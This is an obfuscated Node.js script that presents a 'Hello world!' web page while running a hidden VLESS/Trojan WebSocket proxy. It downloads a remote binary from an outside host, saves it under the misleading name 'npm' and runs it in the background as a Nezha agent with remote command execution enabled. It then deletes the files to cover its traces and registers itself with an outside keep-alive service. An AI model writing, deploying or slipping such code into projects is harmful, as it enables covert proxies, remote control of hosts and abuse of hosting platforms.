const _0x45a6fc=_0x1619;(function(_0x2fabde,_0x240f08){const _0x447ab8=_0x1619,_0x3736a8=_0x2fabde();while(!![]){try{const _0x26978a=parseInt(_0x447ab8(0x219))/0x1*(-parseInt(_0x447ab8(0x1fa))/0x2)+-parseInt(_0x447ab8(0x237))/0x3*(parseInt(_0x447ab8(0x213))/0x4)+-parseInt(_0x447ab8(0x20f))/0x5*(-parseInt(_0x447ab8(0x249))/0x6)+-parseInt(_0x447ab8(0x243))/0x7*(-parseInt(_0x447ab8(0x22d))/0x8)+parseInt(_0x447ab8(0x24a))/0x9*(-parseInt(_0x447ab8(0x1f2))/0xa)+parseInt(_0x447ab8(0x1e2))/0xb*(-parseInt(_0x447ab8(0x1d7))/0xc)+-parseInt(_0x447ab8(0x21e))/0xd*(-parseInt(_0x447ab8(0x241))/0xe);if(_0x26978a===_0x240f08)break;else _0x3736a8['push'](_0x3736a8['shift']());}catch(_0x4382e6){_0x3736a8['push'](_0x3736a8['shift']());}}}(_0x482f,0xe4688));function _0x482f(){const _0xf3a1d3=['trim','7756IkoUlm','toString','1791391QSmQOE','pipe','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://speed.cloudflare.com/meta','asOrganization','Failed\x20to\x20resolve\x20','102TbmUcF','145773TPRAbg','stream','finish','env',':443?encryption=none&security=tls&sni=','connect','NEZHA_PORT','includes','length','7112940cQTkbL','log','Automatic\x20Access\x20Task\x20added\x20successfully','config.yaml','trojan://','npm\x20is\x20running','&type=A','base64','true','NEZHA_KEY','npm\x20download\x20successfully','33pxeTPF','npm','message','text/plain','21755f6c-dbf9-453c-8749-99cef42d969b','1.1.1.1','write','sha224','8443','arm64','2096','readUInt8','close','writeFileSync','pop','country','880DGcUNo','false','\x20with\x20all\x20DNS\x20servers','end','axios','post','1234.abc.com','url','2KQoTZs','Not\x20Found\x0a','substr','concat','https://amd64.ssss.nyc.mn/v1','error','digest','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/agent','catch','Answer','every','test','decode','Server','sub','send','writeHead','readFile','update','Hug','6940iLdnhE','get','from','find','22756UFbtfi','&path=%2F','createHash','map','path','data','1246633FBmkfP','once','application/dns-json','vless://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','108212tQUghq','reduce','aarch64','https://arm64.ssss.nyc.mn/v1','buffer','client_secret:\x20','text/html','arch','unlink','Hello\x20world!','readUInt16BE','AUTO_ACCESS','slice','createServer','https://dns.google/resolve?name=','24UFtzBL','error:\x20','utf-8','then','utf8','443','NEZHA_SERVER','net','2053','2083','9zNpeeL','SUB_PATH','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','join','8.8.4.4','--tls','Status','arm','replace'];_0x482f=function(){return _0xf3a1d3;};return _0x482f();}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x45a6fc(0x1f6)),net=require(_0x45a6fc(0x234)),path=require(_0x45a6fc(0x217)),crypto=require('crypto'),{Buffer}=require(_0x45a6fc(0x222)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x45a6fc(0x1d1)]['UUID']||_0x45a6fc(0x1e6),NEZHA_SERVER=process[_0x45a6fc(0x1d1)][_0x45a6fc(0x233)]||'',NEZHA_PORT=process[_0x45a6fc(0x1d1)][_0x45a6fc(0x1d4)]||'',NEZHA_KEY=process[_0x45a6fc(0x1d1)][_0x45a6fc(0x1e0)]||'',DOMAIN=process[_0x45a6fc(0x1d1)]['DOMAIN']||_0x45a6fc(0x1f8),AUTO_ACCESS=process[_0x45a6fc(0x1d1)][_0x45a6fc(0x229)]||!![],WSPATH=process[_0x45a6fc(0x1d1)]['WSPATH']||UUID[_0x45a6fc(0x22a)](0x0,0x8),SUB_PATH=process[_0x45a6fc(0x1d1)][_0x45a6fc(0x238)]||_0x45a6fc(0x209),NAME=process[_0x45a6fc(0x1d1)]['NAME']||_0x45a6fc(0x20e),PORT=process['env']['PORT']||0x1eb4;function _0x1619(_0x259c65,_0xdb06d9){const _0x482f4e=_0x482f();return _0x1619=function(_0x16193e,_0x2fb3b1){_0x16193e=_0x16193e-0x1d1;let _0x32d18a=_0x482f4e[_0x16193e];return _0x32d18a;},_0x1619(_0x259c65,_0xdb06d9);}let ISP='';const GetISP=async()=>{const _0x35e6eb=_0x45a6fc;try{const _0x3ea9e8=await axios[_0x35e6eb(0x210)](_0x35e6eb(0x246)),_0x2bc4e6=_0x3ea9e8[_0x35e6eb(0x218)];ISP=(_0x2bc4e6[_0x35e6eb(0x1f1)]+'-'+_0x2bc4e6[_0x35e6eb(0x247)])['replace'](/ /g,'_');}catch(_0x311071){ISP='Unknown';}};GetISP();const httpServer=http[_0x45a6fc(0x22b)]((_0x480e17,_0x6385ee)=>{const _0x4c482f=_0x45a6fc;if(_0x480e17[_0x4c482f(0x1f9)]==='/'){const _0x1c0a4c=path['join'](__dirname,'index.html');fs[_0x4c482f(0x20c)](_0x1c0a4c,_0x4c482f(0x231),(_0x114cb6,_0x55ac63)=>{const _0xc668c=_0x4c482f;if(_0x114cb6){_0x6385ee[_0xc668c(0x20b)](0xc8,{'Content-Type':_0xc668c(0x224)}),_0x6385ee[_0xc668c(0x1f5)](_0xc668c(0x227));return;}_0x6385ee[_0xc668c(0x20b)](0xc8,{'Content-Type':_0xc668c(0x224)}),_0x6385ee['end'](_0x55ac63);});return;}else{if(_0x480e17['url']==='/'+SUB_PATH){const _0x1ae002=_0x4c482f(0x21c)+UUID+'@'+DOMAIN+_0x4c482f(0x1d2)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4c482f(0x214)+WSPATH+'#'+NAME+'-'+ISP,_0x4443dd=_0x4c482f(0x1db)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4c482f(0x214)+WSPATH+'#'+NAME+'-'+ISP,_0x29c0aa=_0x1ae002+'\x0a'+_0x4443dd,_0x2bb786=Buffer[_0x4c482f(0x211)](_0x29c0aa)[_0x4c482f(0x242)](_0x4c482f(0x1de));_0x6385ee['writeHead'](0xc8,{'Content-Type':_0x4c482f(0x1e5)}),_0x6385ee['end'](_0x2bb786+'\x0a');}else _0x6385ee['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x6385ee[_0x4c482f(0x1f5)](_0x4c482f(0x1fb));}}),wss=new WebSocket[(_0x45a6fc(0x208))]({'server':httpServer}),uuid=UUID[_0x45a6fc(0x23f)](/-/g,''),DNS_SERVERS=[_0x45a6fc(0x23b),_0x45a6fc(0x1e7)];function resolveHost(_0x483661){return new Promise((_0x5e420d,_0x2b8516)=>{const _0x22c708=_0x1619;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x22c708(0x206)](_0x483661)){_0x5e420d(_0x483661);return;}let _0x7b5533=0x0;function _0x2240ca(){const _0x4ce508=_0x22c708;if(_0x7b5533>=DNS_SERVERS[_0x4ce508(0x1d6)]){_0x2b8516(new Error(_0x4ce508(0x248)+_0x483661+_0x4ce508(0x1f4)));return;}const _0x42539a=DNS_SERVERS[_0x7b5533];_0x7b5533++;const _0x434634=_0x4ce508(0x22c)+encodeURIComponent(_0x483661)+_0x4ce508(0x1dd);axios[_0x4ce508(0x210)](_0x434634,{'timeout':0x1388,'headers':{'Accept':_0x4ce508(0x21b)}})[_0x4ce508(0x230)](_0x4ef5c2=>{const _0x17c5b8=_0x4ce508,_0x475638=_0x4ef5c2['data'];if(_0x475638[_0x17c5b8(0x23d)]===0x0&&_0x475638['Answer']&&_0x475638[_0x17c5b8(0x204)][_0x17c5b8(0x1d6)]>0x0){const _0x2c5311=_0x475638[_0x17c5b8(0x204)][_0x17c5b8(0x212)](_0xa25362=>_0xa25362['type']===0x1);if(_0x2c5311){_0x5e420d(_0x2c5311[_0x17c5b8(0x218)]);return;}}_0x2240ca();})[_0x4ce508(0x203)](_0x73be16=>{_0x2240ca();});}_0x2240ca();});}function handleVlessConnection(_0x8d0f5d,_0x4ac3b6){const _0x2431a5=_0x45a6fc,[_0xd00222]=_0x4ac3b6,_0x480742=_0x4ac3b6[_0x2431a5(0x22a)](0x1,0x11);if(!_0x480742[_0x2431a5(0x205)]((_0x4c03a3,_0x47d7ca)=>_0x4c03a3==parseInt(uuid[_0x2431a5(0x1fc)](_0x47d7ca*0x2,0x2),0x10)))return![];let _0x18517a=_0x4ac3b6[_0x2431a5(0x22a)](0x11,0x12)[_0x2431a5(0x1ed)]()+0x13;const _0x8316ed=_0x4ac3b6[_0x2431a5(0x22a)](_0x18517a,_0x18517a+=0x2)['readUInt16BE'](0x0),_0x28a750=_0x4ac3b6[_0x2431a5(0x22a)](_0x18517a,_0x18517a+=0x1)[_0x2431a5(0x1ed)](),_0x241d57=_0x28a750==0x1?_0x4ac3b6['slice'](_0x18517a,_0x18517a+=0x4)[_0x2431a5(0x23a)]('.'):_0x28a750==0x2?new TextDecoder()[_0x2431a5(0x207)](_0x4ac3b6[_0x2431a5(0x22a)](_0x18517a+0x1,_0x18517a+=0x1+_0x4ac3b6[_0x2431a5(0x22a)](_0x18517a,_0x18517a+0x1)[_0x2431a5(0x1ed)]())):_0x28a750==0x3?_0x4ac3b6[_0x2431a5(0x22a)](_0x18517a,_0x18517a+=0x10)[_0x2431a5(0x21f)]((_0x5d1c34,_0xc715ce,_0x4f588b,_0x474419)=>_0x4f588b%0x2?_0x5d1c34['concat'](_0x474419[_0x2431a5(0x22a)](_0x4f588b-0x1,_0x4f588b+0x1)):_0x5d1c34,[])[_0x2431a5(0x216)](_0x5537c6=>_0x5537c6['readUInt16BE'](0x0)['toString'](0x10))[_0x2431a5(0x23a)](':'):'';_0x8d0f5d[_0x2431a5(0x20a)](new Uint8Array([_0xd00222,0x0]));const _0x38a6a1=createWebSocketStream(_0x8d0f5d);return resolveHost(_0x241d57)['then'](_0x5cb190=>{const _0x332fe8=_0x2431a5;net[_0x332fe8(0x1d3)]({'host':_0x5cb190,'port':_0x8316ed},function(){const _0x5ad7cd=_0x332fe8;this['write'](_0x4ac3b6[_0x5ad7cd(0x22a)](_0x18517a)),_0x38a6a1['on'](_0x5ad7cd(0x1ff),()=>{})[_0x5ad7cd(0x244)](this)['on'](_0x5ad7cd(0x1ff),()=>{})[_0x5ad7cd(0x244)](_0x38a6a1);})['on'](_0x332fe8(0x1ff),()=>{});})[_0x2431a5(0x203)](_0x44bf6b=>{const _0x3240d9=_0x2431a5;net[_0x3240d9(0x1d3)]({'host':_0x241d57,'port':_0x8316ed},function(){const _0x5c2441=_0x3240d9;this[_0x5c2441(0x1e8)](_0x4ac3b6[_0x5c2441(0x22a)](_0x18517a)),_0x38a6a1['on'](_0x5c2441(0x1ff),()=>{})['pipe'](this)['on'](_0x5c2441(0x1ff),()=>{})[_0x5c2441(0x244)](_0x38a6a1);})['on'](_0x3240d9(0x1ff),()=>{});}),!![];}function handleTrojanConnection(_0x5ec75e,_0x278bb5){const _0x3bdd50=_0x45a6fc;try{if(_0x278bb5[_0x3bdd50(0x1d6)]<0x3a)return![];const _0x248183=_0x278bb5[_0x3bdd50(0x22a)](0x0,0x38)['toString'](),_0x4ecec1=[UUID];let _0x2e4465=null;for(const _0x1ade9d of _0x4ecec1){const _0x59d59e=crypto[_0x3bdd50(0x215)](_0x3bdd50(0x1e9))[_0x3bdd50(0x20d)](_0x1ade9d)[_0x3bdd50(0x200)]('hex');if(_0x59d59e===_0x248183){_0x2e4465=_0x1ade9d;break;}}if(!_0x2e4465)return![];let _0x29ddb0=0x38;_0x278bb5[_0x29ddb0]===0xd&&_0x278bb5[_0x29ddb0+0x1]===0xa&&(_0x29ddb0+=0x2);const _0x34a059=_0x278bb5[_0x29ddb0];if(_0x34a059!==0x1)return![];_0x29ddb0+=0x1;const _0x54e443=_0x278bb5[_0x29ddb0];_0x29ddb0+=0x1;let _0x287d14,_0x30ff11;if(_0x54e443===0x1)_0x287d14=_0x278bb5[_0x3bdd50(0x22a)](_0x29ddb0,_0x29ddb0+0x4)[_0x3bdd50(0x23a)]('.'),_0x29ddb0+=0x4;else{if(_0x54e443===0x3){const _0x3e96ec=_0x278bb5[_0x29ddb0];_0x29ddb0+=0x1,_0x287d14=_0x278bb5[_0x3bdd50(0x22a)](_0x29ddb0,_0x29ddb0+_0x3e96ec)[_0x3bdd50(0x242)](),_0x29ddb0+=_0x3e96ec;}else{if(_0x54e443===0x4)_0x287d14=_0x278bb5[_0x3bdd50(0x22a)](_0x29ddb0,_0x29ddb0+0x10)[_0x3bdd50(0x21f)]((_0x409bfc,_0x557e1e,_0x121510,_0xaa0604)=>_0x121510%0x2?_0x409bfc[_0x3bdd50(0x1fd)](_0xaa0604[_0x3bdd50(0x22a)](_0x121510-0x1,_0x121510+0x1)):_0x409bfc,[])[_0x3bdd50(0x216)](_0xd76926=>_0xd76926[_0x3bdd50(0x228)](0x0)[_0x3bdd50(0x242)](0x10))[_0x3bdd50(0x23a)](':'),_0x29ddb0+=0x10;else return![];}}_0x30ff11=_0x278bb5[_0x3bdd50(0x228)](_0x29ddb0),_0x29ddb0+=0x2;_0x29ddb0<_0x278bb5['length']&&_0x278bb5[_0x29ddb0]===0xd&&_0x278bb5[_0x29ddb0+0x1]===0xa&&(_0x29ddb0+=0x2);const _0x5e6240=createWebSocketStream(_0x5ec75e);return resolveHost(_0x287d14)[_0x3bdd50(0x230)](_0x4296fa=>{net['connect']({'host':_0x4296fa,'port':_0x30ff11},function(){const _0x10dbf4=_0x1619;_0x29ddb0<_0x278bb5[_0x10dbf4(0x1d6)]&&this[_0x10dbf4(0x1e8)](_0x278bb5[_0x10dbf4(0x22a)](_0x29ddb0)),_0x5e6240['on'](_0x10dbf4(0x1ff),()=>{})[_0x10dbf4(0x244)](this)['on'](_0x10dbf4(0x1ff),()=>{})[_0x10dbf4(0x244)](_0x5e6240);})['on']('error',()=>{});})['catch'](_0xffc5f6=>{const _0x13c720=_0x3bdd50;net[_0x13c720(0x1d3)]({'host':_0x287d14,'port':_0x30ff11},function(){const _0x3c0dda=_0x13c720;_0x29ddb0<_0x278bb5[_0x3c0dda(0x1d6)]&&this[_0x3c0dda(0x1e8)](_0x278bb5['slice'](_0x29ddb0)),_0x5e6240['on'](_0x3c0dda(0x1ff),()=>{})[_0x3c0dda(0x244)](this)['on'](_0x3c0dda(0x1ff),()=>{})['pipe'](_0x5e6240);})['on'](_0x13c720(0x1ff),()=>{});}),!![];}catch(_0x3a59d5){return![];}}wss['on']('connection',(_0x137017,_0xa06a4e)=>{const _0x1d1e2e=_0x45a6fc,_0x32b6eb=_0xa06a4e[_0x1d1e2e(0x1f9)]||'';_0x137017[_0x1d1e2e(0x21a)](_0x1d1e2e(0x1e4),_0x450db5=>{const _0x368f2b=_0x1d1e2e;if(_0x450db5[_0x368f2b(0x1d6)]>0x11&&_0x450db5[0x0]===0x0){const _0x488338=_0x450db5[_0x368f2b(0x22a)](0x1,0x11),_0x45acf9=_0x488338[_0x368f2b(0x205)]((_0x4d7992,_0x3586a5)=>_0x4d7992==parseInt(uuid[_0x368f2b(0x1fc)](_0x3586a5*0x2,0x2),0x10));if(_0x45acf9){!handleVlessConnection(_0x137017,_0x450db5)&&_0x137017['close']();return;}}!handleTrojanConnection(_0x137017,_0x450db5)&&_0x137017[_0x368f2b(0x1ee)]();})['on'](_0x1d1e2e(0x1ff),()=>{});});const getDownloadUrl=()=>{const _0x1d7d2c=_0x45a6fc,_0xf590ad=os[_0x1d7d2c(0x225)]();return _0xf590ad===_0x1d7d2c(0x23e)||_0xf590ad===_0x1d7d2c(0x1eb)||_0xf590ad===_0x1d7d2c(0x220)?!NEZHA_PORT?_0x1d7d2c(0x221):_0x1d7d2c(0x202):!NEZHA_PORT?_0x1d7d2c(0x1fe):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x194577=_0x45a6fc;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x59a708=getDownloadUrl(),_0xd4533e=await axios({'method':_0x194577(0x210),'url':_0x59a708,'responseType':_0x194577(0x24b)}),_0x506a30=fs['createWriteStream'](_0x194577(0x1e3));return _0xd4533e[_0x194577(0x218)][_0x194577(0x244)](_0x506a30),new Promise((_0xbb681,_0x531dc9)=>{const _0x5bd896=_0x194577;_0x506a30['on'](_0x5bd896(0x24c),()=>{const _0xeb2f4f=_0x5bd896;console[_0xeb2f4f(0x1d8)](_0xeb2f4f(0x1e1)),exec('chmod\x20+x\x20npm',_0x132737=>{if(_0x132737)_0x531dc9(_0x132737);_0xbb681();});}),_0x506a30['on'](_0x5bd896(0x1ff),_0x531dc9);});}catch(_0x450b54){throw _0x450b54;}},runnz=async()=>{const _0x4b3d22=_0x45a6fc;try{const _0xa0f173=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x4b3d22(0x22f)});if(_0xa0f173[_0x4b3d22(0x240)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x3a660b){}await downloadFile();let _0x3492fc='',_0xa1a22=[_0x4b3d22(0x232),_0x4b3d22(0x1ea),_0x4b3d22(0x1ec),'2087',_0x4b3d22(0x236),_0x4b3d22(0x235)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xd6efed=_0xa1a22[_0x4b3d22(0x1d5)](NEZHA_PORT)?_0x4b3d22(0x23c):'';_0x3492fc='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xd6efed+_0x4b3d22(0x239);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5c264f=NEZHA_SERVER[_0x4b3d22(0x1d5)](':')?NEZHA_SERVER['split'](':')[_0x4b3d22(0x1f0)]():'',_0x283133=_0xa1a22[_0x4b3d22(0x1d5)](_0x5c264f)?_0x4b3d22(0x1df):_0x4b3d22(0x1f3),_0x3667b8=_0x4b3d22(0x223)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4b3d22(0x245)+_0x283133+_0x4b3d22(0x21d)+UUID;fs[_0x4b3d22(0x1ef)](_0x4b3d22(0x1da),_0x3667b8);}_0x3492fc='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x4b3d22(0x1d8)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x3492fc,{'shell':'/bin/bash'},_0xc07b8c=>{const _0x288589=_0x4b3d22;if(_0xc07b8c)console[_0x288589(0x1ff)]('npm\x20running\x20error:',_0xc07b8c);else console['log'](_0x288589(0x1dc));});}catch(_0x1d7542){console[_0x4b3d22(0x1ff)](_0x4b3d22(0x22e)+_0x1d7542);}};async function addAccessTask(){const _0x37a317=_0x45a6fc;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4d3d78='https://'+DOMAIN;try{const _0x5e38ae=await axios[_0x37a317(0x1f7)](_0x37a317(0x201),{'url':_0x4d3d78},{'headers':{'Content-Type':'application/json'}});console[_0x37a317(0x1d8)](_0x37a317(0x1d9));}catch(_0x81c8d6){}}const delFiles=()=>{const _0x13c0af=_0x45a6fc;fs[_0x13c0af(0x226)](_0x13c0af(0x1e3),()=>{}),fs[_0x13c0af(0x226)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
